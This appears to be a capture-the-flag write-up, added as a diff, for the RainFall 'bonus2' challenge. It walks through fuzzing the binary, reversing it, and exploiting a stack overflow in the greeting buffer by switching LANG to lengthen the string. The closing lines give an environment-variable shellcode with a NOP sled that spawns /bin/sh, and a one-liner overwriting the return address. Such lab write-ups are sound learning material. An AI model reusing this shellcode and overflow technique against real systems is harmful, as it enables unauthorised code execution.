@@ -1,0 +1,67 @@
+-- Protections --
+0 protection, vulnerable to everything
+not stripped
+
+-- Static analysis --
+arch -> x86 32bits
+static -> no, libc
+import -> memcmp; strcat; getenv; puts; strncpy;
+functions -> main; greetuser;
+export -> language
+Hm language is a weird export, idk how exports work exactly
+Strings -> LANG; Hello; Goedemiddag!; Hyvää päivää  blocks=Basic Latin,Latin-1 Supplement;
+This has something to do with languages then, and the LANG hint at env variable maybe ?
+
+-- Blackbox --
+```
+$ bonus2@RainFall:~$ ./bonus2 "" ""
+Hello
+$ ./bonus2 AAAAA BBBBB
+Hello AAAAA
+```
+On two arg prints hello + first arg
+Since we saw some strcpy and memcmp i wonder if we can overflow the buffer in which its stored
+```
+./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA B
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+```
+We seem to reach the second arg here, can we we break it ?
+```
+./bonus2 $(python -c "print 'A'*2000 + ' ' + 'LANG'")
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALANG
+``` Ok this is safe apparently, but at first it was printing hello with an empty string, lets see here
+```
+./bonus2 $(python -c "print 'A'*2000 + ' ' + 'LANG'")
+```
+Still safe, alright last try, with a big arg2 but no arg1, and with big arg2 + arg1
+```
+./bonus2 $(python -c "print 'A' + ' ' + 'B'*2000") -> safe
+./bonus2 $(python -c "print 'A'*150 + ' ' + 'B'*2000") -> Segmentation fault (core dumped)
+```
+Damn, lets try to be more precise
+```
+./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*26") -> Segmentation fault (core dumped)
+```
+With less than 40 on A nothing happen no matter B size, and as long as A is min 40, 25B work but 26 segv !
+
+-- Reverse --
+The usual r2 commands, check source.c
+Ok main is done, we see memcmp with lang, tried with both and it changes the lang of the hello
+It also changes the padding to make it segfault by 2 apparently
+And with greetuser() done, its just a switch case to print hello in the correct language in a buffer cat with the av buffer
+
+-- Vulnerability && exploit --
+The first buffer is 80 byte long but strncpy allow us to write only 40 into first arg and 32 into second arg
+But the second buffer is 72 only, we when send 65
+So we write 72 into the buffer, and "hello " segfault at 444336 with
+./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*25 +'ABCD'")
+Because 'hello ' is only 6 char so we overwrite only part of eip (4 first to overwrite the actual pushed ebp)
+Lets change language to print "Goedemiddag! " which is 13
+Our theory was correct, 13 of goedemiddag + 'A'*40 + 'B'*19 is 72 (it already segv but not on eip on pop ebp bc \0 after string)
+Lets add 4 to override ebp, and the 4 next will be eip, lets export a shellcode in the env and put an addres in the nopslide as usual
+For example this one "0xbffff73c", dont forget to pack it for 32 bit LE
+And here we go it works !
+
+Wanted to make a pwntool but struggled with env for shellcode, so just one liner
+export SHELLCODE=$(python -c "print '\x90'*512 + '\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh'")
+./bonus2 $(python -c "print 'A'*40 + ' ' + 'B'*19 + 'EBPB' + '\x3c\xf7\xff\xbf'")
